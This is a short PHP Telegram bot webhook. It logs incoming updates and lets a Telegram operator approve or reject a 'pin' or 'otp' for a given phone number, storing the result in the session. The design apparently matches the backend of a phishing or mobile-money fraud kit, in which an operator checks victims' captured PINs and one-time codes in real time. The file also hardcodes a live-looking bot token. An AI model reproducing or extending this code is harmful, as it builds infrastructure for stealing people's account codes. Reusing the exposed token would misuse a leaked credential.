<?php
session_start();

$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";

$update = json_decode(file_get_contents('php://input'), true);

// Optional: log updates for debugging
file_put_contents("log.txt", date('Y-m-d H:i:s') . " | " . json_encode($update) . "\n", FILE_APPEND);

if(isset($update['callback_query'])){
    $callback = $update['callback_query'];

    $data = $callback['data']; // e.g., approve_pin_0712345678
    $chatId = $callback['message']['chat']['id'];
    $messageId = $callback['message']['message_id'];

    $parts = explode('_', $data);
    if(count($parts) < 3) return; // invalid callback_data

    $action = $parts[0]; // approve or reject
    $type   = $parts[1]; // pin or otp
    $phone  = $parts[2]; // phone number

    // Save status in session instead of database
    $_SESSION['status'][$phone][$type] = $action;

    // Telegram message to show
    if($action == 'approve'){
        $text = "✅ " . strtoupper($type) . " Approved";
    } else {
        $text = "❌ " . strtoupper($type) . " Rejected";
    }

    // Edit original Telegram message
    $text = urlencode($text);
    file_get_contents("https://api.telegram.org/bot$token/editMessageText?chat_id=$chatId&message_id=$messageId&text=$text");

    // Respond to Telegram callback so button becomes clickable instantly
    echo json_encode(['status' => 'ok']);
    exit();
}
?>